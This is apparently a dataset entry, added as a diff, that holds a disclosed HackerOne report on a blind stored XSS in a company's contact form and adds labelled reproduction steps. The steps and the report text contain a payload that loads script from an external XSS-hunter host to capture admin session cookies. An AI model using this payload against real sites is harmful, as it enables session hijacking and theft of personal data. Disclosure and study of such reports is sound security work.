@@ -1,0 +1,50 @@
+{
+  "reported_to": "Lab45",
+  "reported_by": "mase289 ",
+  "title": "Blind stored XSS due to insecure contact form at https://www.topcoder.com leads to leakage of session token and other PII",
+  "content": "\nSummary:\nI have discovered a blind stored cross site scripting vulnerability due to an insecure Contact form available here https://www.topcoder.com/contact-us/ This form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle brackets. I was able to submit a blind xss payload through the form which was triggered in backend /admin panel.\nSteps To Reproduce:\n[add details for how we can reproduce the issue]\nBrowse to the page at https://www.topcoder.com/contact-us/ and fill out the contact form submitting your blind XSS payload in First name , Last name, Company and description field.\nSubmit the form and have and admin access the information.\nThis will trigger XSS in the admin panel and a notification to the XSS hunter service with details of the event.\nSupporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n[attachment / reference]\nxsshunter_screenshot.png (F834746) XSS hunter screenshot revealing mail chimp information\n\u2588\u2588\u2588\u2588\u2588 Dom.html you can search through this for my XSS hunter payload \"><script src=https://xvt.xss.ht></script>\n_XSSHunter__XSS_Payload_Fired_On_https___topcoder--mc4sf.visualforce.com_servlet_servlet.Integration_lid_0661K000008g1R7_ic_1_linkToken_VmpFPSxNakF5TUMwd05TMHlNRlF5TXpvME9Eb3dNQzR3T1RWYSxlTjhEX19URWN1QkduZFUzVnU1.eml (F834748) Full XSS hunter email report\nImpact\nAn attacker is able to access critical information from the admin panel. The XSS reveals the administrator\u2019s IP address, backend application service, titles of mail chimp customer and internal subscription emails, admin session cookies.\nAn attacker can exploit the above cookies to access the admin panel.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Stored"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1596835020,
+  "report_url": "https://hackerone.com/reports/878145",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Navigate to the contact form at https://www.topcoder.com/contact-us/"
+    ],
+    [
+      2,
+      "Submit a blind XSS payload in the First Name, Last Name, Company, and Description fields (e.g., \"><script src=https://xvt.xss.ht></script>)"
+    ],
+    [
+      3,
+      "Wait for an admin to access the submitted form data, triggering the XSS payload in the admin panel"
+    ],
+    [
+      4,
+      "Receive the XSS hunter notification containing admin session tokens and other sensitive information"
+    ]
+  ],
+  "vuln_description": "A blind stored XSS vulnerability exists in the contact form at https://www.topcoder.com/contact-us/ due to insufficient input sanitization. An attacker can submit a malicious script payload that executes in the admin panel, leading to session token leakage and potential admin account compromise.",
+  "reason": "The vulnerability involves a straightforward XSS payload submission in a public-facing form, with no complex interactions or state manipulation required. The discovery primarily relies on testing for basic XSS vectors in input fields.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The blind stored XSS vulnerability involves submitting malicious input through a contact form, which is then executed in the admin panel. This does not directly involve swapping user sessions or resource IDs, nor does it involve bypassing authentication or authorization boundaries in the way described by the methodologies. The vulnerability is more about input sanitization and execution context rather than AuthN/AuthZ bypass or IDOR.",
+    "is_detectable": false
+  }
+}
